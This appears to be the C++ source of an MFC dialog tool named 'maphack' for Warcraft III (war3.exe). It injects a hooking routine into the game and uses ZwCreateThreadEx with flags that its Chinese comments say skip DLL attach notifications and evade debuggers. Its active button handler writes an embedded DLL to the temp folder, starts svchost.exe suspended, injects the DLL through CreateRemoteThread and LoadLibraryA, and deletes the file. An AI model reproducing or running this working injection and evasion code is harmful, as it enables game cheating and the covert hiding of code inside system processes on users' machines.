
// maphackDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "maphack.h"
#include "maphackDlg.h"
#include <TlHelp32.h>
#include <string>
#include "input\\crt.h"

using namespace std;

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CmaphackDlg 对话框




CmaphackDlg::CmaphackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CmaphackDlg::IDD, pParent)
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CmaphackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CmaphackDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
  ON_BN_CLICKED(IDOK, &CmaphackDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CmaphackDlg 消息处理程序

BOOL CmaphackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CmaphackDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CmaphackDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

typedef DWORD (WINAPI *pHookEndScene)(LPVOID lpThreadParameter);

typedef DWORD (WINAPI *pInjectCode)( HANDLE hProcess, LPTHREAD_START_ROUTINE lpStartProc );

/*
介绍一个比较高级的API：高版本的系统里在ntdll里导出。

typedef NTSTATUS (NTAPI *_ZwCreateThreadEx)(
OUT PHANDLE ThreadHandle,
IN ACCESS_MASK DesiredAccess,
IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
IN HANDLE ProcessHandle,
IN PTHREAD_START_ROUTINE StartRoutine,
IN PVOID StartContext,
IN ULONG CreateThreadFlags,
IN SIZE_T ZeroBits OPTIONAL,
IN SIZE_T StackSize OPTIONAL,
IN SIZE_T MaximumStackSize OPTIONAL,
IN PPROC_THREAD_ATTRIBUTE_LIST AttributeList
);

这里不关心其他参数的使用，只关心绿色的flags参数.
当这个参数不是0的时候，我的系统上线程总是会创建后立刻暂停，所以使用该参数为其他值的时候，需要使用ResumeThread让线程跑起来。

因为类型是ULONG,所以参数CreateThreadFlags除了让线程停止之外应该具有其他功能。
用IDA把目光瞄准内核代码，发现这个参数会影响ETHREAD中的一些东西，
恰巧的是传入值为2的时候，可以绕过DLL_ATTACH_THREAD,大家都懂得。
另外就是传入值为4的时候，貌似OD里对这个线程里的代码下断会飞，似乎是hidefromdbgger的功能。
8的时候，没测试出东西来，不过flags最大就是0xF,再大就创建线程失败了。

*/

typedef LONG  NTSTATUS;

typedef LONG (NTAPI *_ZwCreateThreadEx)(
  OUT PHANDLE ThreadHandle,
  IN ACCESS_MASK DesiredAccess,
  IN PVOID ObjectAttributes OPTIONAL,
  IN HANDLE ProcessHandle,
  IN PTHREAD_START_ROUTINE StartRoutine,
  IN PVOID StartContext,
  IN ULONG CreateThreadFlags,
  IN SIZE_T ZeroBits OPTIONAL,
  IN SIZE_T StackSize OPTIONAL,
  IN SIZE_T MaximumStackSize OPTIONAL,
  IN PPROC_THREAD_ATTRIBUTE_LIST AttributeList
  );

_ZwCreateThreadEx ZwCreateThreadEx;
typedef
NTSTATUS (NTAPI *_ZwAllocateVirtualMemory)(
  _In_     HANDLE ProcessHandle,
  _Inout_  PVOID *BaseAddress,
  _In_     ULONG_PTR ZeroBits,
  _Inout_  PSIZE_T RegionSize,
  _In_     ULONG AllocationType,
  _In_     ULONG Protect
);

_ZwAllocateVirtualMemory ZwAllocateVirtualMemory;

typedef
NTSTATUS (NTAPI *_ZwProtectVirtualMemory)(
  _In_ HANDLE 	ProcessHandle,
  _In_ PVOID* 	BaseAddress,
  _In_ SIZE_T* 	NumberOfBytesToProtect,
  _In_ ULONG 	  NewAccessProtection,
  _Out_ PULONG 	OldAccessProtection 
);

_ZwProtectVirtualMemory   ZwProtectVirtualMemory;

typedef
NTSTATUS (NTAPI *_ZwGetContextThread)(
  _In_ HANDLE 	ThreadHandle,
  _Out_ PCONTEXT 	Context 
);

_ZwGetContextThread       ZwGetContextThread;

typedef struct _CLIENT_ID
{
  HANDLE UniqueProcess;
  HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _USER_STACK {
  PVOID FixedStackBase;
  PVOID FixedStackLimit;
  PVOID ExpandableStackBase;
  PVOID ExpandableStackLimit;
  PVOID ExpandableStackBottom;
} USER_STACK, *PUSER_STACK;

#define PAGE_SIZE 4096

HANDLE WINAPI MyCreateThread(HANDLE processHandle, PTHREAD_START_ROUTINE startRoutine, PVOID startContext)
{
  USER_STACK stack = {0};

  HANDLE threadHandle = NULL;
  DWORD ret;
  ULONG n = 1024*1024;//1MB

  ret=ZwAllocateVirtualMemory(processHandle, &stack.ExpandableStackBottom, 0, &n,MEM_RESERVE, PAGE_READWRITE);

  stack.ExpandableStackBase = PCHAR(stack.ExpandableStackBottom) +1024*1024;
  stack.ExpandableStackLimit = PCHAR(stack.ExpandableStackBase) - 4096;
  n = 4096 + PAGE_SIZE;

  PVOID p = PCHAR(stack.ExpandableStackBase) - n;

  ret=ZwAllocateVirtualMemory(processHandle, &p, 0, &n, MEM_COMMIT, PAGE_READWRITE);

  ULONG x; n = PAGE_SIZE;
  ret=ZwProtectVirtualMemory(processHandle, &p, &n, PAGE_READWRITE | PAGE_GUARD, &x);

  CONTEXT context = {CONTEXT_FULL};

  ret=ZwGetContextThread(GetCurrentThread(),&context);

  context.Esp = ULONG(stack.ExpandableStackBase) - 2048;
  context.Eip = ULONG(startRoutine);

  // CLIENT_ID cid;

  ret=ZwCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, 0, processHandle, startRoutine, startContext, 2, 0, 0, 0, NULL);
  if (threadHandle != NULL)
  {
    ResumeThread(threadHandle);
  }
  // ret=ZwCreateThread(&threadHandle, THREAD_ALL_ACCESS, 0, processHandle, &cid, &context, &stack, TRUE);
  return threadHandle;
}

void EnableMapHack()
{
  DWORD   processId;
  HMODULE inputModule;
  HMODULE ntdllModule;
  HANDLE  processHandle;
  HANDLE  threadHandle;
  DWORD   addressInjected;
  // LONG    status;
  // DWORD   threadId;

  ntdllModule = GetModuleHandleA("ntdll.dll");
  ZwCreateThreadEx = (_ZwCreateThreadEx)GetProcAddress(ntdllModule, "ZwCreateThreadEx");
  ZwAllocateVirtualMemory = (_ZwAllocateVirtualMemory)GetProcAddress(ntdllModule, "ZwAllocateVirtualMemory");
  ZwProtectVirtualMemory = (_ZwProtectVirtualMemory)GetProcAddress(ntdllModule, "ZwProtectVirtualMemory");
  ZwGetContextThread = (_ZwGetContextThread)GetProcAddress(ntdllModule, "ZwGetContextThread");

  processId = GetProcessID(TEXT("war3.exe"));
  inputModule = LoadLibrary(TEXT("input.dll"));

  pHookEndScene   HookEndScene;
  pInjectCode     InjectCode;

  HookEndScene = (pHookEndScene)GetProcAddress(inputModule, "HookEndScene");
  InjectCode = (pInjectCode)GetProcAddress(inputModule, "InjectCode");

  processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
  addressInjected = InjectCode(processHandle, HookEndScene);

  threadHandle = MyCreateThread(processHandle, (PTHREAD_START_ROUTINE)addressInjected, NULL);
  if (threadHandle != NULL)
  {
    ::OutputDebugStringA("---- inject success.");
    CloseHandle(threadHandle);
  }
  else
  {
    ::OutputDebugStringA("---- inject failed.");
  }

  //status = ZwCreateThreadEx(&threadHandle, THREAD_ALL_ACCESS, NULL, processHandle, (LPTHREAD_START_ROUTINE)addressInjected, NULL, 2, 0, 0, 0, NULL);
  //if (status != 0)
  ////threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)addressInjected, NULL, 0, &threadId);
  //// if (threadHandle == NULL)
  //{
  //  CHAR    message[2048];
  //  sprintf_s(message, 2048, "\n ----- error code:%.8x ---------", status);
  //  ::OutputDebugStringA(message);
  //}
  //else
  //{
  //  ResumeThread(threadHandle);
  //  CloseHandle(threadHandle);
  //}
  CloseHandle(processHandle);
}

string LoadResource()
{
  HRSRC   res;
  DWORD   sizeRes;
  HGLOBAL gl;
  LPVOID  lp;
  HANDLE  fp;
  DWORD   a;
  CHAR    path[2048];

  res = FindResource(NULL, MAKEINTRESOURCE(IDR_DLL), TEXT("DATA"));
  if (res == NULL)
    return NULL;
  sizeRes = SizeofResource(NULL, res);
  if (0 == sizeRes)
    return NULL;

  gl = LoadResource(NULL, res);
  if (NULL == gl)
    return NULL;

  lp = LockResource(gl);
  if (NULL == lp)
    return NULL;

  GetTempPathA(sizeof(path), path);
  strcat_s(path, "\\temp.dll");

  fp = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
  if (!WriteFile(fp, lp, sizeRes, &a, NULL))
    return NULL;

  CloseHandle(fp);
  FreeResource(gl);
  return path;
}

bool CreateSvchost( PHANDLE hProcess )
{
  WCHAR Svchost[] = {'s','v','c','h','o','s','t','.','e','x','e',0};
  WCHAR Args[]	= {'-','k',' ','n','e','t','s','v','c','s',0};

  WCHAR *SysPath = (WCHAR*)malloc( 512 );

  if ( !SysPath )
  {
    return false;
  }

  GetSystemDirectoryW( SysPath, 512 );

  lstrcatW( SysPath, L"\\" );
  lstrcatW( SysPath, Svchost );

  PROCESS_INFORMATION pi;
  STARTUPINFOW si;

  memset( &si, 0, sizeof( STARTUPINFOW ) );		
  si.cb	= sizeof( STARTUPINFOW );

  bool ret = false;

  if( (BOOL)CreateProcessW( SysPath, Args, 0, 0, TRUE, CREATE_SUSPENDED, 0, 0, &si, &pi ) )
  {
    *hProcess = pi.hProcess;
    ret = true;
  }

  free( SysPath );
  return ret;
}

BOOL WINAPI LoadLib(const char* lpszLibName)
{
  BOOL   bResult          = FALSE; 
  HANDLE hProcess         = NULL;
  HANDLE hThread          = NULL;
  PSTR   pszLibFileRemote = NULL;

  if (!CreateSvchost(&hProcess))
  {
    MessageBoxA(NULL, "failed create svchost", "dll", MB_OK);
    return FALSE;
  }

  __try 
  {
    int cch = (1 + strlen(lpszLibName))*sizeof(CHAR);

    pszLibFileRemote = (PSTR)VirtualAllocEx(
      hProcess, 
      NULL, 
      cch, 
      MEM_COMMIT, 
      PAGE_READWRITE
      );

    if (pszLibFileRemote == NULL)
    {
      __leave;
    }

    if (!WriteProcessMemory(
      hProcess, 
      (PVOID)pszLibFileRemote, 
      (PVOID)lpszLibName, 
      cch, 
      NULL))
    {
      __leave;
    }


    PTHREAD_START_ROUTINE pfnThreadRtn = 
      (PTHREAD_START_ROUTINE)GetProcAddress(
      GetModuleHandleA("Kernel32"), "LoadLibraryA");

    if (pfnThreadRtn == NULL)
    {
      __leave;
    }

    hThread = CreateRemoteThread(
      hProcess, 
      NULL, 
      0, 
      pfnThreadRtn, 
      (PVOID)pszLibFileRemote, 
      0, 
      NULL
      );
    if (hThread == NULL) 
    {
      DebugString("error code:%d", GetLastError());
      __leave;
    }

    WaitForSingleObject(hThread, INFINITE);
    bResult = TRUE; 
  }
  __finally 
  { 
    if (pszLibFileRemote != NULL) 
      VirtualFreeEx(hProcess, (PVOID)pszLibFileRemote, 0, MEM_RELEASE);

    if (hThread  != NULL) 
      CloseHandle(hThread);
    if (hProcess != NULL) 
      CloseHandle(hProcess);
  }
  return bResult;
}

void InjectDllToSvchost()
{
  string    filename;
  filename = LoadResource();
  if (!LoadLib(filename.c_str()))
  {
    MessageBox(NULL, TEXT("failed inject dll"), TEXT("dll"), MB_OK);
    return;
  }
  
  DeleteFileA(filename.c_str());
}

void CmaphackDlg::OnBnClickedOk()
{
  // TODO: Add your control notification handler code here
  OnOK();
  InjectDllToSvchost();
  // EnableMapHack();
}
